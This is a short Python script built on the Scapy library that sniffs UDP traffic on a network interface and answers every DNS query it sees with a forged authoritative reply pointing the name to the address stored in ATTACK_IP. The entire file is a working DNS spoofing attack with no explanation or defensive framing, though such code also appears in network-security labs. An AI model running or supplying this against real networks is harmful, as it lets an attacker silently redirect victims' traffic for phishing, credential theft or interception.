from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.packet import Packet
from scapy.sendrecv import send, sniff

ATTACK_IP = "6.6.6.6"


def get_ip_version(packet: Packet):
    if packet.haslayer(IP):
        return IP

    elif packet.haslayer(IPv6):
        return IPv6


def dns_poisoning(packet: Packet):
    ip_version = get_ip_version(packet=packet)

    if packet.haslayer(DNS) and packet[DNS].opcode == 0 and packet[DNS].qr == 0:
        # if "example" in packet[DNSQR].qname.decode():
        print(f"Intercepted DNS query: {packet[DNSQR].qname.decode()}")
        print(f"src: {packet[ip_version].src}, dst: {packet[ip_version].dst}")
        try:
            response = (
                ip_version(dst=packet[ip_version].src, src=packet[ip_version].dst)
                / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                / DNS(
                    id=packet[DNS].id,
                    qr=1,  # Response
                    aa=1,  # Authoritative Answer
                    qd=packet[DNS].qd,
                    an=DNSRR(
                        rrname=packet[DNS].qd.qname,
                        type="A",
                        rclass="IN",
                        ttl=300,
                        rdata=ATTACK_IP,
                    ),
                )
            )
            send(response, verbose=False)
            print(f"Sent spoofed DNS response with id {packet[DNS].id}!")
        except Exception as _e:
            pass


filter_string = "udp"
sniff(prn=dns_poisoning, filter=filter_string, iface="eth1")
